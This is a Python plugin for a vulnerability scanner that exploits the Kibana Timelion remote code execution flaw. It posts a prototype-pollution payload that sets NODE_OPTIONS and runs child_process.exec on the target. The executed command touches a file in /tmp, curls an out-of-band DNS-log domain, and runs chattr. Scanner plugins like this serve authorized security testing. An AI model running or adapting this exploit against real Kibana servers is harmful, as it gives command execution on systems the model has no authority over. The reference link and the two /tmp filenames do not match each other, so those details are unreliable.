#!/usr/bin/env python
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    if service != 'http':
        return
    base_url = "{}://{}:{}".format(service, ip, port)

    domain = dns_monitor(ip, port).add_checker(
        'kibana-timelion-rce', alert_group='Kibana Timelion RCE',
        details='Reference: https://github.com/vulhub/vulhub/tree/master/spark/unacc')
    command = 'curl http://{}'.format(domain)
    cmd = "touch /tmp/pwned_by_security2.txt && " + command + "&& chattr +i /tmp/pwned_by_security.txt"
    payload = {
        "sheet": [
            ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"" + cmd +
            "\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],
        "time": {"from": "now-1m", "to": "now", "mode": "quick", "interval": "auto",
                 "timezone": "Asia/Shanghai"}
    }

    try:
        r = await http_client(ip, port).get(base_url + "/app/timelion", headers={"User-Agent": GLOBAL_USER_AGENT}, timeout=20)
        if r.text.find('kbn-injected-metadata') < 0:
            return
        soup = BeautifulSoup(r.text, 'lxml')
        kbn_version = re.compile(r'\d\.\d\.\d').search(str(soup.find("kbn-injected-metadata"))).group(0)

        header = {
            "User-Agent": GLOBAL_USER_AGENT,
            'Connection': 'close',
            'kbn-version': kbn_version,
            'Content-Type': 'application/json;charset=UTF-8'
        }

        await http_client(ip, port).post(base_url + "/api/timelion/run", data=json.dumps(payload), headers=header, timeout=20)

    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 5601, 'http', True, task_msg={})
    run_plugin_test(scan)
